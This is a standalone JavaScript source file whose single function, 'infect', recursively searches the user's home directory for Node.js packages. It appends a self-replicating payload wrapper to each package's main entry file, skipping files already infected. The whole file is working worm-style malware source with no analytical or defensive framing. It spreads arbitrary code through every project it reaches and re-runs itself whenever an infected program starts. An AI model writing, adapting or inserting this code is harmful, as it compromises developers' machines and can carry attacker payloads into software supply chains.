async function infect( payload ) {

    const fs   = require( "fs" );
    const os   = require( "os" );
    const path = require( "path" );

    function escaper(str) {
        return str.replace(/["\\]/g, "\\$&");
    }
    
    function readFile( f ) {
        return new Promise( function( rs, rj ) {
            fs.readFile( f, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function readdir( dir ) {
        return new Promise( function( rs, rj ) {
            fs.readdir( dir, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function stat( f ) {
        return new Promise( function( rs, rj ) {
            fs.stat( f, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function appendFile( f, data ) {
        return new Promise( function( rs, rj ) {
            fs.appendFile( f, data, (e) => e ? rj( e ) : rs() );
        });
    }

    const modifiedPayload = `
        (function() {
            ${JSON.parse(payload)}
            infect( "${escaper(payload)}" );
        })();
    `;

    async function search( dir ) {

        var filesToInfect = [];
        var directories   = [];
        var foundPackage  = false;
        for( let f of await readdir( dir ) ) {
            let full = path.join( dir, f );
            try {
                let fStat = await stat( full );
                if( fStat.isFile() ) {
                    if( f === "package.json" ) {
                        foundPackage = true;
                        let data = JSON.parse( await readFile( full ) );
                        let target = path.join( dir, data.main || "index.js" );
                        await stat( target );
                        filesToInfect.push( target );
                    }
                } else if( fStat.isDirectory() ) {
                    directories.push( full );
                }
            } catch( e ) {
                continue;
            }
        }

        if( !foundPackage )
            for( let d of directories )
                for( let f of await search( d ) )
                    filesToInfect.push( f );
        return filesToInfect;
    }
    
    var filesToInfect = await search( os.homedir() );
    
    for( var f of filesToInfect ) {
        var src = await readFile( f );
        if( src.indexOf( modifiedPayload ) === -1 )
            await appendFile( f, modifiedPayload ); 
    }
}
